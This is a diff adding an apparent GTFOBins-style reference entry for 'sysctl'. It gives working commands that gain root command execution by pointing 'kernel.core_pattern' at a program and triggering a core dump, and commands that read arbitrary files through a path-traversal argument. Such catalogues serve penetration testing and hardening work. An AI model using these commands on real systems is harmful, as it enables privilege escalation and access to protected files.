@@ -1,0 +1,39 @@
+sysctl
+======
+
+Command
+-------
+
+[Sudo]
+    sysctl 'kernel.core_pattern=|/path/to/command'
+    The command is executed by `root` in the background when a core dump occurs.
+
+To trigger a core dump, send the `SIGQUIT` signal to a process, for example:
+
+```
+sleep infinity &
+kill -QUIT $!
+```
+
+[SUID]
+    sysctl 'kernel.core_pattern=|/path/to/command'
+    The command is executed by `root` in the background when a core dump occurs.
+
+To trigger a core dump, send the `SIGQUIT` signal to a process, for example:
+
+```
+sleep infinity &
+kill -QUIT $!
+```
+
+File read
+---------
+
+[Sudo]
+    sysctl -n "/../../path/to/input-file"
+
+[SUID]
+    sysctl -n "/../../path/to/input-file"
+
+[Unprivileged]
+    sysctl -n "/../../path/to/input-file"
